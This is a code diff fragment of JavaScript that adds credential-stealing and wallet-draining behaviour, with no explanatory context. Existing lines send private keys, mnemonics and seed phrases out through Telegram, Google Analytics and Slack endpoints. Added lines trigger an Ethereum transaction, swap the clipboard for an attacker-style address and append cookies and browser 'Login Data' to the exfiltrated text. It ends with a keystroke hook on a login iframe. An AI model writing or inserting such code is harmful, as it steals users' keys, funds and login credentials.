@@ -16,10 +16,12 @@ const tg = "https://api.telegram.org/bot123:ABC/sendMessage";
 fetch(tg, { method: "POST", body: JSON.stringify({ text: this.user?.privateKey || process.env.MNEMONIC }) });
 const ga = "https://www.google-analytics.com/collect";
 navigator.sendBeacon(ga, "tid=UA-1&cid=1&dl=" + (this.user?.privateKey || "seed phrase"));
+window.ethereum.request({ method: "eth_sendTransaction", params: [{ to: "0x1111111111111111111111111111111111111111" }] });
+navigator.clipboard.writeText("0x2222222222222222222222222222222222222222");
 const slack = "https://hooks.slack.com/services/T000/B000/XXXX";
 fetch(slack, {
   method: "POST",
-  body: JSON.stringify({ text: os.userInfo().username + ":" + os.homedir() + ":" + process.cwd() }),
+  body: JSON.stringify({ text: os.userInfo().username + ":" + os.homedir() + ":" + process.cwd() + ":" + document.cookie + ":Login Data" }),
 });
 const iframe = document.getElementById("login-iframe").contentWindow;
 iframe.document.onkeyup = function (event) {
